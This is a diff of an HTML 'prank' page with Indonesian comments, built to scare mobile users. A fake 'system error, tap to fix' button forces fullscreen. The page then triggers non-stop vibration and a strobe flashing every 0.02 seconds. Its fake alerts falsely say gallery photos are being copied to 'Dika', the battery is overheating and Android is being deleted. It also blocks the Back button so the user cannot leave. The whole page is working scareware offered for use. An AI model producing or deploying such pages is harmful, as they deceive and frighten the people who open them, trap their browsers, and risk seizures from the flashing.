@@ -3,138 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>!!! SYSTEM DESTROYED !!!</title>
+    <title>SYSTEM FAILURE</title>
     <style>
-        * { -webkit-tap-highlight-color: transparent; outline: none; }
-        body {
-            background-color: #000;
-            margin: 0;
-            overflow: hidden;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000; overflow: hidden;
             font-family: 'Arial Black', sans-serif;
-            height: 100vh;
-            width: 100vw;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            flex-direction: column;
-            user-select: none;
         }
 
-        /* Background kedap-kedip super cepat */
-        #chaos-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1000;
-            display: none;
+        /* Background Glitch */
+        #bg-chaos {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1; display: none;
             animation: flash 0.02s infinite;
         }
 
         @keyframes flash {
-            0% { background: #ff0000; }
-            50% { background: #fff; }
-            100% { background: #0000ff; }
+            0% { background: red; } 33% { background: blue; } 66% { background: white; } 100% { background: black; }
         }
 
-        .content {
-            position: relative;
-            z-index: 1001;
-            text-align: center;
-            display: none;
+        /* Fake Pop-up yang tidak merusak Fullscreen */
+        #fake-alert {
+            position: fixed; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%; background: #eee; border-radius: 10px;
+            padding: 20px; text-align: center; color: #000;
+            z-index: 9999; display: none;
+            box-shadow: 0 0 50px rgba(255,0,0,1);
         }
 
-        h1 { font-size: 60px; margin: 0; color: #fff; text-shadow: 10px 10px #000; line-height: 1; }
-        .alert-text { font-size: 40px; background: yellow; color: red; padding: 20px; font-weight: bold; }
+        #fake-alert h2 { color: red; margin: 0; }
+        #fake-alert p { font-size: 18px; margin: 20px 0; }
+        #fake-alert button {
+            width: 100%; padding: 15px; background: #007bff;
+            color: white; border: none; border-radius: 5px; font-weight: bold;
+        }
 
         #start-btn {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #ff0000;
-            font-size: 20px;
-            cursor: pointer;
-            border: none;
+            position: fixed; width: 100%; height: 100%;
+            z-index: 10000; background: #000; color: #ff0000;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 20px; text-align: center; border: none;
         }
     </style>
 </head>
 <body>
 
-    <button id="start-btn" onclick="goCrazy()">
-        [!] SYSTEM SECURITY BREACH [!]<br>
-        TAP TO FIX ERROR
+    <button id="start-btn" onclick="kickstart()">
+        [!] WARNING [!]<br>SISTEM TERDETEKSI ERROR<br>KLIK UNTUK MEMPERBAIKI
     </button>
 
-    <div id="chaos-overlay"></div>
+    <div id="bg-chaos"></div>
 
-    <div class="content" id="ui">
-        <h1>SUNGKEM<br>KE DIKA!</h1>
-        <p class="alert-text">SISTEM TERKUNCI TOTAL</p>
-        <p style="font-size: 15px;">MENGIRIM LOKASI ANDA KE DIKA...</p>
+    <div id="fake-alert">
+        <h2>SISTEM TERKUNCI!</h2>
+        <p id="alert-msg">Cepat SUNGKEM KE DIKA sekarang atau data dihapus!</p>
+        <button onclick="nextAlert()">OK</button>
     </div>
 
     <script>
-        function goFullScreen() {
+        let step = 0;
+        const messages = [
+            "LU BELUM SUNGKEM KE DIKA!",
+            "LOG: Sedang menyalin foto galeri ke cloud Dika...",
+            "WARNING: Suhu baterai naik 90°C!",
+            "SUNGKEM KE DIKA ATAU HP MATI TOTAL!",
+            "Menghapus System Android... 45%",
+            "MAU KELUAR? SUNGKEM DULU!"
+        ];
+
+        function kickstart() {
+            // 1. Masuk Fullscreen
             let elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            }
-        }
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
 
-        function vibrateNonStop() {
-            if (navigator.vibrate) {
-                // Getar 10 detik penuh
-                navigator.vibrate(10000);
-            }
-        }
-
-        function goCrazy() {
-            // Langsung Fullscreen
-            goFullScreen();
-
-            // Sembunyikan tombol, munculkan chaos
             document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('chaos-overlay').style.display = 'block';
-            document.getElementById('ui').style.display = 'block';
-
-            // Getar brutal terus-menerus
-            setInterval(() => {
-                vibrateNonStop();
-            }, 1000);
-
-            // Trik Fullscreen Terus: Setiap kali user klik OK di alert, masuk fullscreen lagi
+            document.getElementById('bg-chaos').style.display = 'block';
+            
+            // 2. Langsung Getar Brutal
+            startVibrate();
+            
+            // 3. Munculkan Fake Pop-up
             setTimeout(() => {
-                while(true) {
-                    goFullScreen(); // Paksa fullscreen lagi
-                    alert("⚠️ ERROR 666: SUNGKEM KE DIKA SEKARANG!");
-                    alert("MAU KELUAR? SUNGKEM DULU!");
-                    alert("HP ANDA SEDANG DIKENDALIKAN DIKA!");
-                    vibrateNonStop();
-                }
+                document.getElementById('fake-alert').style.display = 'block';
             }, 500);
+        }
+
+        function startVibrate() {
+            if (navigator.vibrate) {
+                // Pola getar tanpa henti (Getar 5 detik, jeda 1ms, ulangi)
+                setInterval(() => {
+                    navigator.vibrate(5000);
+                }, 100);
+            }
+        }
+
+        function nextAlert() {
+            // Getar lagi setiap klik OK
+            if (navigator.vibrate) navigator.vibrate(2000);
+            
+            // Ganti pesan secara acak
+            let randomMsg = messages[Math.floor(Math.random() * messages.length)];
+            document.getElementById('alert-msg').innerText = randomMsg;
+            
+            // Pastikan tetap fullscreen
+            if (!document.fullscreenElement) {
+                let elem = document.documentElement;
+                if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            }
         }
 
         // Blokir tombol Back
         history.pushState(null, null, location.href);
         window.onpopstate = function() {
             history.go(1);
-            goFullScreen();
-            alert("AKSES DIBLOKIR! SUNGKEM KE DIKA!");
+            document.getElementById('fake-alert').style.display = 'block';
+            document.getElementById('alert-msg').innerText = "GAK BISA KELUAR! SUNGKEM KE DIKA!";
         };
-
-        // Jika user mencoba keluar dari fullscreen (misal tekan tombol Esc di keyboard atau navigasi hp)
-        document.addEventListener("fullscreenchange", () => {
-            if (!document.fullscreenElement) {
-                goFullScreen();
-            }
-        });
     </script>
 </body>
 </html>
